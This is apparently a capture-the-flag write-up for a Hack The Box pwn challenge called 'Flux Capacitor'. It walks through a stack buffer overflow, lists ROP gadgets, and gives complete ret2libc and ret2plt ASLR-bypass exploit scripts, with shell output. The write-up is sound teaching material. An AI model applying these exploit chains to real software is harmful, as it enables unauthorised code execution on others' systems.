---
title:  "[CTF] Flux Capacitor"
categories: [CTF, HTB, Pwn]
---

**Category**:    Pwn
**Description**: 
*We managed to get back to 1955 but we did not bring any Plutonuim with us. Now we need to somehow fill Flux Capacitor with 1.21 gigawatts of power. Think Marty, think.. otherwise you are gonna stuck here and forever!*

## Vulnerability identification

The challenge presents a binary with a very straightforward `main` function, which prints some stuff and overflows a buffer by `0xE0` (224) bytes:

```c
undefined8 main(void)
{
 undefined overflow [32];
  
  setup();
  write(1,"\nFlux capacitor: \n",0x13);
  write(1," __         __\n",0x10);
  write(1,"(__)       (__)\n",0x11);
  write(1," \\ \\       / /\n",0x10);
  write(1,"  \\ \\     / /\n",0xf);
  write(1,"   \\ \\   / /\n",0xe);
  write(1,"    \\ \\ / /\n",0xd);
  write(1,"     \\   /\n",0xc);
  write(1,"      \\ /\n",0xb);
  write(1,"      | |\n",0xb);
  write(1,"      | |\n",0xb);
  write(1,"      | |\n",0xb);
  write(1,"      |_|\n",0xb);
  write(1,"      (_)\n",0xb);
  write(1,"\n\n[*] Year: [1955]",0x13);
  write(1,"\n[*] Plutonium ",0x10);
  write(1,"is not available ",0x12);
  write(1,"to everoyne.\n",0xe);
  write(1,"\n[Doc]  : We need ",0x13);
  write(1,"to find a way to",0x11);
  write(1," fill the Flux ",0x10);
  write(1,"Capacitor with ",0x10);
  write(1,"energy. Any ideas",0x12);
  write(1," Marty?\n[Marty]: ",0x12);
 read(0,overflow,0x100);
  write(1,"\n[Doc]  : This ",0x10);
  write(1,"will not work..\n\n",0x12);
  return 0;
}
```

In terms of security protections, the application is an ELF-64 binary, compiled without stack canaries and PIE, but stack is not executable:

![Menu](/assets/images/Flux/checksec.png)

## Exploitation

### Exploit without ASLR

Although the binary is compiled without position independent code, meaning its code section cannot be relocated, the other libraries will be relocated due to ASLR being enabled system-wide. This makes the exploitation more difficult, because the binary is quite short and doesn’t contain that many gadgets:

```asm
$ ropper -f flux_capacitor       
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======

0x00000000004005ae: adc byte ptr [rax], ah; jmp rax; 
0x00000000004008dd: add al, ch; sub eax, 0xb8fffffc; add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x000000000040057f: add bl, dh; ret; 
0x00000000004004f2: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x000000000040095d: add byte ptr [rax], al; add bl, dh; ret; 
0x000000000040095b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x00000000004008e4: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x00000000004008e5: add byte ptr [rax], al; add cl, cl; ret; 
0x00000000004008dc: add byte ptr [rax], al; call 0x510; mov eax, 0; leave; ret; 
0x000000000040067a: add byte ptr [rax], al; call 0x520; nop; pop rbp; ret; 
0x00000000004005b6: add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400962: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x00000000004005a4: add byte ptr [rax], al; test rax, rax; je 0x5b8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004005e6: add byte ptr [rax], al; test rax, rax; je 0x5f8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004008e6: add byte ptr [rax], al; leave; ret; 
0x00000000004005b5: add byte ptr [rax], r8b; pop rbp; ret; 
0x0000000000400617: add byte ptr [rcx], al; pop rbp; ret; 
0x00000000004008e7: add cl, cl; ret; 
0x00000000004004ee: add eax, 0x200b05; test rax, rax; je 0x4fa; call rax; 
0x00000000004004ee: add eax, 0x200b05; test rax, rax; je 0x4fa; call rax; add rsp, 8; ret; 
0x00000000004004ef: add eax, 0x4800200b; test eax, eax; je 0x4fa; call rax; 
0x00000000004004ef: add eax, 0x4800200b; test eax, eax; je 0x4fa; call rax; add rsp, 8; ret; 
0x00000000004004fb: add esp, 8; ret; 
0x00000000004004fa: add rsp, 8; ret; 
0x00000000004004f1: and byte ptr [rax], al; test rax, rax; je 0x4fa; call rax; 
0x00000000004004f1: and byte ptr [rax], al; test rax, rax; je 0x4fa; call rax; add rsp, 8; ret; 
0x00000000004008de: call 0x510; mov eax, 0; leave; ret; 
0x000000000040067c: call 0x520; nop; pop rbp; ret; 
0x0000000000400672: call 0x540; mov edi, 0x7f; call 0x520; nop; pop rbp; ret; 
0x000000000040060d: call 0x590; mov byte ptr [rip + 0x200a0f], 1; pop rbp; ret; 
0x0000000000400b27: call qword ptr [rax + 1]; 
0x0000000000400b93: call qword ptr [rax]; 
0x00000000004004f8: call rax; 
0x00000000004004f8: call rax; add rsp, 8; ret; 
0x000000000040093c: fmul qword ptr [rax - 0x7d]; ret; 
0x00000000004004ea: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x200b05; test rax, rax; je 0x4fa; call rax; 
0x00000000004004f6: je 0x4fa; call rax; 
0x00000000004004f6: je 0x4fa; call rax; add rsp, 8; ret; 
0x00000000004005a9: je 0x5b8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004005eb: je 0x5f8; pop rbp; mov edi, 0x601010; jmp rax; 
0x0000000000400678: jg 0x67a; add byte ptr [rax], al; call 0x520; nop; pop rbp; ret; 
0x0000000000400aff: jmp qword ptr [rax]; 
0x0000000000400bfb: jmp qword ptr [rbp]; 
0x0000000000400bdb: jmp qword ptr [rsi + 2]; 
0x00000000004005b1: jmp rax; 
0x0000000000400612: mov byte ptr [rip + 0x200a0f], 1; pop rbp; ret; 
0x00000000004008e3: mov eax, 0; leave; ret; 
0x00000000004004ed: mov eax, dword ptr [rip + 0x200b05]; test rax, rax; je 0x4fa; call rax; 
0x00000000004004ed: mov eax, dword ptr [rip + 0x200b05]; test rax, rax; je 0x4fa; call rax; add rsp, 8; ret; 
0x000000000040060b: mov ebp, esp; call 0x590; mov byte ptr [rip + 0x200a0f], 1; pop rbp; ret; 
0x00000000004005ac: mov edi, 0x601010; jmp rax; 
0x0000000000400677: mov edi, 0x7f; call 0x520; nop; pop rbp; ret; 
0x0000000000400286: mov edx, 0x543d0b63; ret 0x529b; 
0x00000000004004ec: mov rax, qword ptr [rip + 0x200b05]; test rax, rax; je 0x4fa; call rax; 
0x00000000004004ec: mov rax, qword ptr [rip + 0x200b05]; test rax, rax; je 0x4fa; call rax; add rsp, 8; ret; 
0x000000000040060a: mov rbp, rsp; call 0x590; mov byte ptr [rip + 0x200a0f], 1; pop rbp; ret; 
0x00000000004005b3: nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004005f5: nop dword ptr [rax]; pop rbp; ret; 
0x0000000000400615: or ah, byte ptr [rax]; add byte ptr [rcx], al; pop rbp; ret; 
0x00000000004004eb: or byte ptr [rax - 0x75], cl; add eax, 0x200b05; test rax, rax; je 0x4fa; call rax; 
0x00000000004004f0: or esp, dword ptr [rax]; add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x000000000040094c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040094e: pop r13; pop r14; pop r15; ret; 
0x0000000000400950: pop r14; pop r15; ret; 
0x0000000000400952: pop r15; ret; 
0x00000000004005ab: pop rbp; mov edi, 0x601010; jmp rax; 
0x000000000040094b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040094f: pop rbp; pop r14; pop r15; ret; 
0x00000000004005b8: pop rbp; ret; 
0x0000000000400953: pop rdi; ret; 
0x0000000000400951: pop rsi; pop r15; ret; 
0x000000000040094d: pop rsp; pop r13; pop r14; pop r15; ret; 
0x0000000000400609: push rbp; mov rbp, rsp; call 0x590; mov byte ptr [rip + 0x200a0f], 1; pop rbp; ret; 
0x000000000040028a: push rsp; ret 0x529b; 
0x000000000040028b: ret 0x529b; 
0x00000000004004f5: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004008df: sub eax, 0xb8fffffc; add byte ptr [rax], al; add byte ptr [rax], al; leave; ret; 
0x0000000000400965: sub esp, 8; add rsp, 8; ret; 
0x00000000004004e9: sub esp, 8; mov rax, qword ptr [rip + 0x200b05]; test rax, rax; je 0x4fa; call rax; 
0x0000000000400964: sub rsp, 8; add rsp, 8; ret; 
0x00000000004004e8: sub rsp, 8; mov rax, qword ptr [rip + 0x200b05]; test rax, rax; je 0x4fa; call rax; 
0x00000000004004f4: test eax, eax; je 0x4fa; call rax; 
0x00000000004004f4: test eax, eax; je 0x4fa; call rax; add rsp, 8; ret; 
0x00000000004005a7: test eax, eax; je 0x5b8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004005e9: test eax, eax; je 0x5f8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004004f3: test rax, rax; je 0x4fa; call rax; 
0x00000000004004f3: test rax, rax; je 0x4fa; call rax; add rsp, 8; ret; 
0x00000000004005a6: test rax, rax; je 0x5b8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004005e8: test rax, rax; je 0x5f8; pop rbp; mov edi, 0x601010; jmp rax; 
0x00000000004008e8: leave; ret; 
0x0000000000400681: nop; pop rbp; ret; 
0x00000000004004fe: ret; 

92 gadgets found                                                                                                                                                     
```

Let’s see first how exploitation would look like without ASLR. To temporary disable it, run the following command, then test:

```bash
$ sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
                                                                                                                                                            
$ ldd flux_capacitor 
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcc000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
                                                                                                                                                            
$ ldd flux_capacitor
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcc000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
```

*Notice the load address for `libc.so.6 ` is now always the same each time we check!* 

Next we can generate a `0x100` bytes pattern and see where the instruction pointer gets overwritten after the buffer  overflow:

```bash
gef➤ pattern create 256
[+] Generating a pattern of 256 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
```

![Pattern](/assets/images/Flux/pattern.png)

The exploitation steps for the no-ASLR scenario are really well documented in [Introduction to x64 Linux Binary Exploitation (Part 2)—return into libc](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465). We need to put together a few pieces, mainly the address of `system` function, the address for a `POP RDI` instruction, and a few others.

<div class="box-note">
While some of the gadgets can be found in the vulnerable binary itself, we can’t get everything from there so we need more gadgets and strings from <pre>libc</pre>.
</div>

Find a POP RDI instruction:

```bash
$ ropper
(ropper)> file flux_capacitor
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.

(flux_capacitor/ELF/x86_64)> search /1/ pop rdi
[INFO] Searching for gadgets: pop rdi
[INFO] File: flux_capacitor
0x0000000000400953: pop rdi; ret;
```

Confirm we found the correct instruction:

```asm
gef➤ x/2i 0x0000000000400953
0x400953 <__libc_csu_init+99>: pop rdi
0x400954 <__libc_csu_init+100>: ret
```

Next find an occurance of `/bin/sh` script, which we’ll use as a parameter to `system` function call:

```bash
$ ldd flux_capacitor
linux-vdso.so.1 (0x00007ffff7fc9000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcc000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)

$ strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
196031 /bin/sh

gef➤ x/s 0x7ffff7dcc000 + 0x196031
0x7ffff7f62031: "/bin/sh"
```

<div class="box-note">
The binary to be exploited is provided together with the <pre>libc.so.6</pre> library, that would be present on the target machine, in case we need to search any gadgets or offsets.
</div>

Next we need to locate the address of the `system` function:

```bash
$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system
1023: 000000000004c330 45 FUNC WEAK DEFAULT 16 system@@GLIBC_2.2.5

gef➤ x/5i 0x00007ffff7dcc000 + 0x4c330
0x7ffff7e18330 <__libc_system>: test rdi,rdi
0x7ffff7e18333 <__libc_system+3>: je 0x7ffff7e18340 <__libc_system+16>
0x7ffff7e18335 <__libc_system+5>: jmp 0x7ffff7e17ec0 <do_system>
```

Finally, we need the base address of `libc.so.6`. The offsets discovered above will be added to this address where the `libc.so.6` will be loaded dynamically. Since ASLR is disabled for now, this address will be the same every time that we run the vulnerable program and can be found by examining the process’s memory allocation:

```asm
gef➤  vmmap 
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /mnt/hgfs/CTF-oct-23/pwn_flux_capacitor/flux_capacitor
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /mnt/hgfs/CTF-oct-23/pwn_flux_capacitor/flux_capacitor
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /mnt/hgfs/CTF-oct-23/pwn_flux_capacitor/flux_capacitor
0x00007ffff7dc9000 0x00007ffff7dcc000 0x0000000000000000 rw- 
0x00007ffff7dcc000 0x00007ffff7df2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7df2000 0x00007ffff7f47000 0x0000000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f47000 0x00007ffff7f9a000 0x000000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9a000 0x00007ffff7f9e000 0x00000000001ce000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9e000 0x00007ffff7fa0000 0x00000000001d2000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
```

<div class="box-note">The 64 bit calling convention requires the stack to be 16-byte aligned before a <pre>call</pre> instruction but this is easily violated during ROP chain execution. To work around this, we might need one or a couple of ROP NOPs instructions (i.e. addresses of RET instructions). The final Python script to generate an exploitation payload for non-ASLR case looks like so:
</div>

```python
import sys
import struct

read_buf_len = 0x100

offset = 40

libc_base = 0x7ffff7dcc000      # Base address of libc.so.6 (no ASLR)
pop_rdi = 0x400953              # POP RDI (in flux_capacitor)
nop_ret = 0x400954              # RET (in flux_capacitor)
bin_sh = libc_base + 0x196031   # /bin/sh in libc.so.6
system = libc_base + 0x4c330    # system() in libc.so.6

buf  = b'A' * offset 

buf += struct.pack('<Q', nop_ret)
buf += struct.pack('<Q', pop_rdi)
buf += struct.pack('<Q', bin_sh)
buf += struct.pack('<Q', system)

sys.stdout.buffer.write(buf)
```

We can easily use this, even without [Pwntools](https://docs.pwntools.com/en/stable/), to get a shell:

```bash
$ (python create_payload_no_aslr.py; cat) | ./flux_capacitor

Flux capacitor:
..

[*] Year: [1955]
[*] Plutonium is not available to everoyne.

[Doc] : We need to find a way to fill the Flux Capacitor with energy. Any ideas Marty?
[Marty]:
[Doc] : This will not work..

id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),115(scanner),138(wireshark),141(kaboxer)
pwd
/mnt/hgfs/CTF-oct-23/pwn_flux_capacitor
```

### Exploit with ASLR enabled

First we need to enable ASLR. We’ll use the same command as before, but this time with parameter value `2`.  This will randomise the address space, includiung the positions of the stack, *virtual dynamic shared object* (VDSO) page, shared memory regions and data segments as well. For most systems, this setting is the default and the most secure setting. As expected, the payload now crashes the application:

```bash
$ (python create_payload_no_aslr; cat) | ./flux_capacitor

Flux capacitor: 
 _         _
()       ()
 \ \       / /
  \ \     / /
   \ \   / /
    \ \ / /
     \   /
      \ /
      | |
      | |
      | |
      ||
      ()


[] Year: [1955]
[] Plutonium is not available to everoyne.

[Doc]  : We need to find a way to fill the Flux Capacitor with energy. Any ideas Marty?
[Marty]: 
[Doc]  : This will not work..

id
zsh: broken pipe         ( python pwn_flux_capacitor.py; cat; ) | 
zsh: segmentation fault  ./flux_capacitor
```

We need a different strategy. This is where the [return2plt](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass) attack comes in handy in order to leak a function pointer and bypass ASLR.

<div class="box-note">
While debugging, it’s very useful to set a breakpoint before the <pre>read()</pre> function call, which is very close to the end of the program, to watch both the buffer overflow and RIP overwrite in action:<br>
<pre>
b *(main+558)
</pre>
</div>

To summarise, the attack will be split in multiple steps:

1. Use the buffer overflow and `return2plt` attack to return to `write` function, and leak its address.
    1. This will be used to compute the base address of `libc`.
2. After exiting the `write` function, return into `main`, and run the program again, exploiting it a second time.
    1. This time, knowing the base address of `libc.so.6`, perform a classic `return2libc` attack.
3. Make sure to add more data as input to the vulnerable program, in the form of commands to be executed within the shell. They will be fed to it as standard input.

<div class="box-note">
It’s very very useful to be able to debug <pre>pwntools</pre> Python scripts. It’s possible to attach a debugger, set up a breakpoint (for exampel before the <pre>read()</pre> call) and gradually feed input and parse output from the vulnerable program:
</div>

```python
io = gdb.debug(bin_path, gdbscript = 'b *(main+558)')
```

For phase 1, leaking the base address of libc, we have the following ROP chain:

```python
offset = 40                     # Offset to overwrite RIP

# Phase 1 - Ret2Plt 
# Leak the address of write function and libc

buf  = b'A' * offset 

pop_rsi = 0x400951              # pop rsi; pop r15; ret 
write_plt = 0x400510            # Address of write in PLT
write_got = 0x600fd0            # Address of write in GOT
main = 0x00400684               # main() (Return after first run)

buf += struct.pack('<Q', pop_rsi)
buf += struct.pack('<Q', write_got)     # POP-ed into RSI (2nd parameter to write)
buf += struct.pack('<Q', 0x41414141)    # POP-ed into R15 
buf += struct.pack('<Q', write_plt)     # Call this
buf += struct.pack('<Q', main)          # ret after write
```

The goal of this first stage is to call the `write` function, using it’s address in PLT

* Its first argument would be in RDI, but in our case RDI register will already be set to 1 (`stdout`) so we don’t need to set it.
* The second argument, what to write, will be taken from RSI. That’s why we POP into RSI the address of write function in GOT table, which would point into the real address in `libc.so.6`.
* The 3rd argument to `write` would be the size to write. Again we don’t need to worry about this because RDX register is correctly set 
* We also put on the stack the address of `main` function, to return there after write, and basically be able to re-exploit the program.

We then compute the base address of `libc` library, and reproduce the previous attack. The final script to bypass ASLR with two ROP chains, heavily commented:

```python
import sys
import struct

from pwn import *

bin_path = './flux_capacitor'
io = process(bin_path)

# Local process under GDB
# Break before the read() call 
#io = gdb.debug(bin_path, gdbscript = 'b *(main+558)')

read_buf_len = 0x100

offset = 40                     # Offset to overwrite RIP

# Phase 1 - Ret2Plt 
# Leak the address of write function and libc

buf  = b'A' * offset 

pop_rsi = 0x400951              # pop rsi; pop r15; ret 
write_plt = 0x400510            # Address of write in PLT
write_got = 0x600fd0            # Address of write in GOT
main = 0x00400684               # main() (Return after first run)

buf += struct.pack('<Q', pop_rsi)
buf += struct.pack('<Q', write_got)     # POP-ed into RSI (2nd parameter to write)
buf += struct.pack('<Q', 0x41414141)    # POP-ed into R15 
buf += struct.pack('<Q', write_plt)     # Call this
buf += struct.pack('<Q', main)          # ret after write

# We need to supply all 0x100 bytes expected by read
buf += b'A' * (read_buf_len - len(buf))
print("[*] Sending %d (0x%x) bytes (first iteration)" % (len(buf), len(buf)))

io.send(buf)

recv_buf = io.recvrepeat(3)
#print(recv_buf)

print("[*] Received %d (0x%x) bytes" % (len(recv_buf), len(recv_buf)))
leak_write_addr_str = recv_buf.split(b'not work..\n\n\x00')[1][:8]
leak_write_addr = struct.unpack('<Q', leak_write_addr_str)[0]
print("[*] Leaked write() address: 0x%016x" % leak_write_addr)

# Phase 2 - Ret2Libc
# Spawn a shell

write_offset = 0xFB0D0          # Offset to write() in libc 
libc_base = leak_write_addr - write_offset
print("[*] Libc base address: 0x%016x" % libc_base)

bin_sh = libc_base + 0x199031   # /bin/sh in libc.so.6
system = libc_base + 0x4f330    # system() in libc.so.6

pop_rdi = 0x400953              # POP RDI (in flux_capacitor)
nop_ret = 0x400954              # RET (in flux_capacitor)

buf  = b'B' * offset
buf += struct.pack('<Q', nop_ret)
buf += struct.pack('<Q', nop_ret)
buf += struct.pack('<Q', pop_rdi)
buf += struct.pack('<Q', bin_sh)
buf += struct.pack('<Q', system)

buf += b'B' * (read_buf_len - len(buf))

# Second iteration
print("[*] Sending %d (0x%x) bytes (2nd iteration)" % (len(buf), len(buf)))
io.send(buf)
recv_buf = io.recvrepeat(3)
#print(recv_buf)

# Execute some commands in the shell
buf = b''

cmds = b'\x0aid\x0auname -a\x0a'
buf += cmds

io.send(buf)
recv_buf = io.recvrepeat(2).decode("utf-8") 
print(recv_buf)


```

And the shell in action:

```
$ python pwn_flux_capacitor.py          
[+] Starting local process './flux_capacitor': pid 2134427
[*] Sending 256 (0x100) bytes (first iteration)
[*] Received 770 (0x302) bytes
[*] Leaked write() address: 0x00007f7d428730d0
[*] Libc base address: 0x00007f7d42778000
[*] Sending 256 (0x100) bytes (2nd iteration)

uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),115(scanner),138(wireshark),141(kaboxer)

Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux

[*] Stopped process './flux_capacitor' (pid 2134427)
```

## References

* [Pwntools tutorial - Debugging](https://github.com/Gallopsled/pwntools-tutorial/blob/master/debugging.md)
* [Linux/x64 - execve(/bin/sh) Shellcode (23 bytes)](https://www.exploit-db.com/exploits/46907)
* [How to Test a Shellcode](https://rjordaney.is/lectures/test_a_shellcode/)
* [fgets() Deprecated and dangerous](http://www.crasseux.com/books/ctutorial/fgets.html)
* [Introduction to x64 Linux Binary Exploitation (Part 1)](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef)
* [Introduction to x64 Linux Binary Exploitation (Part 2)—return into libc](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465)
* [Introduction to x64 Linux Binary Exploitation (Part 5)- ASLR](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-5-aslr-394d0dc8e4fb)
* [Controlling stack execution protection](https://www.ibm.com/docs/en/linux-on-z?topic=protection-control)
* [GDB exiting instead of spawning a shell](https://stackoverflow.com/questions/30972544/gdb-exiting-instead-of-spawning-a-shell)
* [ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget/tree/master)
* [GOT and PLT for pwning.](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
* [ROP Chain Exploit x64 with example](https://akshit-singhal.medium.com/rop-chain-exploit-with-example-7e444939a2ec)
* [ret2plt ASLR bypass (x86)](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)
* [Configuring ASLR with randomize_va_space](https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/)
* [RET TO ROP](https://ret2rop.blogspot.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html)
